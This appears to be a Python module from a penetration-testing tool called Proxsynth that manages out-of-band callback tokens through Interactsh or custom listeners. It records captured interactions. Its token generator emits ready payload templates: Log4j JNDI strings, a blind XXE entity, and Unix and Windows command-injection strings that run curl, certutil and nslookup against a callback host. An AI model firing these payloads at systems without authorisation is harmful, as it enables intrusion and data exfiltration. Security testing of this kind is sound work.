"""
Proxsynth - OAST (Out-of-Band Application Security Testing) Engine
Handles generation of unique correlation tokens, listener endpoints,
and real-time callback capture for Blind SSRF, Blind SQLi, Out-of-Band RCE, and DNS queries.
Supports:
  1. Interactsh Cloud / Public OAST (ProjectDiscovery protocol via oast.fun / oast.live)
  2. Custom Public Callback URL / Domain (e.g. ngrok, VPS, collaborator)
  3. Local Loopback / Lab listener (127.0.0.1:8000 / *.proxsynth.local)
"""

import os
import json
import uuid
import time
import asyncio
import base64
import random
import string
from datetime import datetime
from typing import Dict, Any, List, Optional, Tuple

import httpx
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
try:
    from cryptography.hazmat.decrepit.ciphers.modes import CFB
except ImportError:
    from cryptography.hazmat.primitives.ciphers.modes import CFB

from backend.database import SessionLocal, OastEvent, Project

# In-memory listeners for active polling: token -> asyncio.Event
_active_waiters: Dict[str, asyncio.Event] = {}
# Registry mapping token -> metadata (project, vuln_type, description, provider, etc.)
_token_registry: Dict[str, Dict[str, Any]] = {}
_runtime_callback_url: Optional[str] = None


class InteractshSession:
    """
    Manages client-side zero-knowledge encryption and interaction polling
    with public or self-hosted Interactsh OAST servers (ProjectDiscovery protocol).
    """

    def __init__(self, server: Optional[str] = None):
        self.server = (server or os.getenv("PROXSYNTH_INTERACTSH_SERVER", "https://oast.fun")).strip().rstrip("/")
        # Extract base domain from server URL (e.g. https://oast.fun -> oast.fun)
        self.domain = self.server.split("://")[-1].split(":")[0].split("/")[0]
        self.correlation_id: str = "".join(random.choices(string.ascii_lowercase + string.digits, k=20))
        self.secret: str = str(uuid.uuid4())
        self._private_key: Optional[rsa.RSAPrivateKey] = None
        self._registered: bool = False
        self._lock = asyncio.Lock()

    def _ensure_keys(self) -> Tuple[rsa.RSAPrivateKey, str]:
        if self._private_key is None:
            self._private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        pub_pem = self._private_key.public_key().public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        pub_b64 = base64.b64encode(pub_pem).decode("utf-8")
        return self._private_key, pub_b64

    def register_sync(self) -> bool:
        """Synchronously registers public key and correlation ID with the Interactsh server."""
        if self._registered:
            return True
        priv_key, pub_b64 = self._ensure_keys()
        try:
            with httpx.Client(timeout=10.0, verify=False) as client:
                resp = client.post(
                    f"{self.server}/register",
                    json={
                        "public-key": pub_b64,
                        "secret-key": self.secret,
                        "correlation-id": self.correlation_id
                    }
                )
                if resp.status_code == 200:
                    self._registered = True
                    return True
        except Exception:
            pass
        return False

    async def register(self) -> bool:
        """Registers public key and correlation ID with the Interactsh server."""
        async with self._lock:
            if self._registered:
                return True
            priv_key, pub_b64 = self._ensure_keys()
            try:
                async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
                    resp = await client.post(
                        f"{self.server}/register",
                        json={
                            "public-key": pub_b64,
                            "secret-key": self.secret,
                            "correlation-id": self.correlation_id
                        }
                    )
                    if resp.status_code == 200:
                        self._registered = True
                        return True
            except Exception:
                pass
            return False

    def generate_token_payload(self) -> Tuple[str, str, str]:
        """
        Generates a 13-character nonce which combines with 20-char correlation_id
        to create standard 33-char Interactsh payload subdomain.
        Returns: (token_id, full_domain, full_http_url)
        """
        nonce = "".join(random.choices(string.ascii_lowercase + string.digits, k=13))
        token_id = nonce  # Use nonce as our internal token reference
        full_domain = f"{self.correlation_id}{nonce}.{self.domain}"
        full_http_url = f"http://{full_domain}"
        return token_id, full_domain, full_http_url

    async def poll_and_record(self) -> List[Dict[str, Any]]:
        """
        Polls Interactsh server, decrypts received payloads,
        and records them into the Proxsynth SQLite database.
        """
        if not self._registered:
            ok = await self.register()
            if not ok:
                return []

        try:
            async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
                resp = await client.get(f"{self.server}/poll?id={self.correlation_id}&secret={self.secret}")
                if resp.status_code != 200:
                    return []
                data = resp.json()
        except Exception:
            return []

        items = (data.get("data") or []) + (data.get("extra") or [])
        if not items or not data.get("aes_key"):
            return []

        # Decrypt AES key with RSA-OAEP SHA256
        try:
            enc_aes_key = base64.b64decode(data["aes_key"])
            aes_key = self._private_key.decrypt(
                enc_aes_key,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
        except Exception:
            return []

        new_events = []
        for item_b64 in items:
            try:
                cb = base64.b64decode(item_b64)
                if len(cb) <= 16:
                    continue
                iv = cb[:16]
                ct = cb[16:]

                # Primary: AES-CTR mode (Interactsh v1.3.0+)
                decrypted_text = ""
                try:
                    cipher = Cipher(algorithms.AES(aes_key), modes.CTR(iv))
                    dec = cipher.decryptor()
                    plain = dec.update(ct) + dec.finalize()
                    decrypted_text = plain.decode("utf-8", errors="replace")
                except Exception:
                    pass

                # Fallback: AES-CFB mode (legacy Interactsh)
                if not decrypted_text or not decrypted_text.strip().startswith("{"):
                    try:
                        cipher = Cipher(algorithms.AES(aes_key), CFB(iv))
                        dec = cipher.decryptor()
                        plain = dec.update(ct) + dec.finalize()
                        decrypted_text = plain.decode("utf-8", errors="replace")
                    except Exception:
                        pass

                if not decrypted_text:
                    continue

                event_json = json.loads(decrypted_text, strict=False)
                unique_id = event_json.get("unique-id", "")
                # Extract the 13-char nonce token from unique-id if 33 chars
                token_match = unique_id[20:] if len(unique_id) >= 33 else unique_id

                recorded = record_oast_hit(
                    token=token_match or unique_id or self.correlation_id,
                    client_ip=event_json.get("remote-address", "0.0.0.0"),
                    method=event_json.get("protocol", "HTTP").upper(),
                    path=f"/{event_json.get('q-type', '')}".rstrip("/"),
                    headers={"full-id": event_json.get("full-id"), "q-type": event_json.get("q-type")},
                    query_params={},
                    body=event_json.get("raw-request", ""),
                    protocol=event_json.get("protocol", "HTTP").upper(),
                    description=f"Interactsh captured {event_json.get('protocol')} from {event_json.get('remote-address')}"
                )
                if recorded:
                    new_events.append(recorded)
            except Exception:
                continue

        return new_events


# Global shared interactsh session
_global_interactsh: Optional[InteractshSession] = None


def get_interactsh_session_sync() -> Optional[InteractshSession]:
    """Returns singleton Interactsh session, initializing synchronously."""
    global _global_interactsh
    if _global_interactsh is None:
        _global_interactsh = InteractshSession()
        _global_interactsh.register_sync()
    elif not _global_interactsh._registered:
        _global_interactsh.register_sync()
    return _global_interactsh


async def get_interactsh_session() -> InteractshSession:
    """Returns singleton Interactsh session, initializing registration on first request."""
    global _global_interactsh
    if _global_interactsh is None:
        _global_interactsh = InteractshSession()
        await _global_interactsh.register()
    return _global_interactsh


def set_base_callback_url(url: str):
    """Dynamically sets the public/custom URL for OAST callback delivery (e.g. ngrok or VPS)."""
    global _runtime_callback_url
    _runtime_callback_url = url.strip().rstrip("/") if url else None


def get_base_callback_url() -> str:
    """Returns the external or local URL for receiving out-of-band callbacks."""
    if _runtime_callback_url:
        return _runtime_callback_url
    custom_url = os.getenv("PROXSYNTH_OAST_CALLBACK_URL", "").strip().rstrip("/")
    if custom_url:
        return custom_url
    backend_url = os.getenv("PROXSYNTH_BACKEND_URL", "http://127.0.0.1:8000").strip().rstrip("/")
    return backend_url


def generate_oast_token(
    project: str = "default",
    description: str = "",
    vuln_type: str = "BLIND_CALLBACK",
    provider: str = "auto"
) -> Dict[str, Any]:
    """
    Generates a unique OAST interaction token and correlation metadata.
    Providers:
      - 'auto' (default): Uses public Interactsh (oast.fun) for internet-facing targets,
                          custom URL if set, or local listener if offline.
      - 'interactsh': Forces ProjectDiscovery Interactsh out-of-band listener.
      - 'custom': Uses PROXSYNTH_OAST_CALLBACK_URL / PROXSYNTH_OAST_DOMAIN.
      - 'local': Uses local Proxsynth listener (127.0.0.1:8000 / *.proxsynth.local).
    """
    target_project = (project or "default").strip().lower()
    clean_provider = (provider or "auto").strip().lower()
    custom_domain = os.getenv("PROXSYNTH_OAST_DOMAIN", "").strip()
    custom_url = os.getenv("PROXSYNTH_OAST_CALLBACK_URL", "").strip().rstrip("/")

    # Resolve effective provider
    effective_provider = clean_provider
    if effective_provider == "auto":
        env_pref = os.getenv("PROXSYNTH_OAST_PROVIDER", "").strip().lower()
        if env_pref:
            effective_provider = env_pref
        elif custom_url or custom_domain:
            effective_provider = "custom"
        else:
            effective_provider = "interactsh"

    token = uuid.uuid4().hex[:12]
    callback_url = ""
    dns_hostname = ""

    if effective_provider == "interactsh":
        try:
            interactsh_obj = get_interactsh_session_sync()
            if interactsh_obj and interactsh_obj._registered:
                token, dns_hostname, callback_url = interactsh_obj.generate_token_payload()
                effective_provider = "interactsh"
            else:
                effective_provider = "local"
        except Exception:
            effective_provider = "local"

    if effective_provider == "custom":
        if custom_domain:
            dns_hostname = f"{token}.{custom_domain}"
            callback_url = f"http://{dns_hostname}/oast/{token}"
        elif custom_url:
            callback_url = f"{custom_url}/oast/{token}"
            dns_hostname = custom_url.split("://")[-1].split(":")[0].split("/")[0]
        else:
            effective_provider = "local"

    if effective_provider == "local":
        base_url = get_base_callback_url()
        callback_url = f"{base_url}/oast/{token}"
        dns_hostname = f"{token}.oast.proxsynth.local"

    # Pre-register waiter event in memory
    _active_waiters[token] = asyncio.Event()
    _token_registry[token] = {
        "project": target_project,
        "description": description or f"OAST correlation token for {vuln_type}",
        "vuln_type": vuln_type.upper(),
        "provider": effective_provider,
        "dns_hostname": dns_hostname,
        "callback_url": callback_url
    }

    return {
        "token": token,
        "provider": effective_provider,
        "callback_url": callback_url,
        "http_url": callback_url,
        "dns_hostname": dns_hostname,
        "curl_test": f"curl -s {callback_url}",
        "vuln_type": vuln_type.upper(),
        "project": target_project,
        "description": description or f"OAST correlation token for {vuln_type}",
        "payload_templates": {
            "log4j_jndi": f"${{jndi:ldap://{dns_hostname}/a}}",
            "log4j_dns": f"${{jndi:dns://{dns_hostname}/a}}",
            "blind_xxe": f'<!ENTITY % xxe SYSTEM "{callback_url}/eval.dtd"> %xxe;',
            "blind_ssrf": callback_url,
            "cmd_injection_unix": f"; curl -s {callback_url} || nslookup {dns_hostname} ;",
            "cmd_injection_win": f"& certutil -urlcache -split -f {callback_url} & nslookup {dns_hostname}",
            "ssti_resolver": f'{{{{resolve "{dns_hostname}"}}}}'
        },
        "created_at": datetime.now().isoformat()
    }


def record_oast_hit(
    token: str,
    client_ip: str = "127.0.0.1",
    method: str = "GET",
    path: str = "",
    headers: Optional[Dict[str, Any]] = None,
    query_params: Optional[Dict[str, Any]] = None,
    body: str = "",
    protocol: str = "HTTP",
    project: str = "default",
    description: str = ""
) -> Optional[Dict[str, Any]]:
    """
    Persists an incoming out-of-band interaction into SQLite and triggers any active polling agents.
    """
    db = SessionLocal()
    try:
        clean_token = token.strip()
        reg = _token_registry.get(clean_token, {})
        effective_project = reg.get("project") or (project or "default").strip().lower()
        effective_vuln = reg.get("vuln_type") or "BLIND_INTERACTION"
        effective_desc = description or reg.get("description") or f"Incoming {protocol} callback from {client_ip}"

        headers_json = json.dumps(headers or {})
        params_json = json.dumps(query_params or {})

        event = OastEvent(
            project=effective_project,
            token=clean_token,
            vuln_type=effective_vuln,
            protocol=protocol.upper(),
            client_ip=client_ip,
            method=method.upper(),
            path=path or f"/oast/{clean_token}",
            request_headers=headers_json,
            query_params=params_json,
            request_body=(body or "")[:65536],  # Store up to 64 KB of exfiltrated data
            description=effective_desc
        )
        db.add(event)
        db.commit()
        db.refresh(event)
        event_dict = event.to_dict()

        # Signal in-memory waiter if an agent is waiting on this token
        if clean_token in _active_waiters:
            _active_waiters[clean_token].set()

        return event_dict
    except Exception:
        db.rollback()
        return None
    finally:
        db.close()


async def poll_oast_events(
    token: str,
    project: str = "default",
    timeout_seconds: float = 5.0
) -> List[Dict[str, Any]]:
    """
    Polls for callbacks matching token. If token belongs to Interactsh,
    queries the Interactsh server first to fetch live out-of-band hits.
    Waits asynchronously up to timeout_seconds for an incoming callback.
    """
    clean_token = token.strip()
    target_project = (project or "default").strip().lower()
    reg = _token_registry.get(clean_token, {})
    is_interactsh = reg.get("provider") == "interactsh" or _global_interactsh is not None

    # 1. If Interactsh might have received external hits, poll the Interactsh server
    if is_interactsh and _global_interactsh:
        try:
            await _global_interactsh.poll_and_record()
        except Exception:
            pass

    # 2. Quick check database
    db = SessionLocal()
    try:
        events = db.query(OastEvent).filter(
            OastEvent.token == clean_token
        ).order_by(OastEvent.id.desc()).all()
        if events:
            return [e.to_dict() for e in events]
    finally:
        db.close()

    # 3. If no event yet, register or retrieve asyncio.Event waiter
    if clean_token not in _active_waiters:
        _active_waiters[clean_token] = asyncio.Event()

    waiter = _active_waiters[clean_token]
    t_end = time.time() + max(0.5, float(timeout_seconds))

    while time.time() < t_end:
        rem = max(0.2, t_end - time.time())
        try:
            await asyncio.wait_for(waiter.wait(), timeout=min(2.0, rem))
            break
        except asyncio.TimeoutError:
            if is_interactsh and _global_interactsh:
                try:
                    await _global_interactsh.poll_and_record()
                except Exception:
                    pass
            # Check DB again
            db = SessionLocal()
            try:
                events = db.query(OastEvent).filter(
                    OastEvent.token == clean_token
                ).order_by(OastEvent.id.desc()).all()
                if events:
                    return [e.to_dict() for e in events]
            finally:
                db.close()

    # 4. Final re-query database after waiting
    db = SessionLocal()
    try:
        events = db.query(OastEvent).filter(
            OastEvent.token == clean_token
        ).order_by(OastEvent.id.desc()).all()
        return [e.to_dict() for e in events]
    finally:
        db.close()


def list_recent_oast_events(project: str = "default", limit: int = 50) -> List[Dict[str, Any]]:
    """Returns recent OAST callbacks for the dashboard or agent."""
    db = SessionLocal()
    try:
        query = db.query(OastEvent)
        if project and project.upper() != "ALL":
            query = query.filter(OastEvent.project == project.lower())
        events = query.order_by(OastEvent.id.desc()).limit(min(limit, 200)).all()
        return [e.to_dict() for e in events]
    finally:
        db.close()
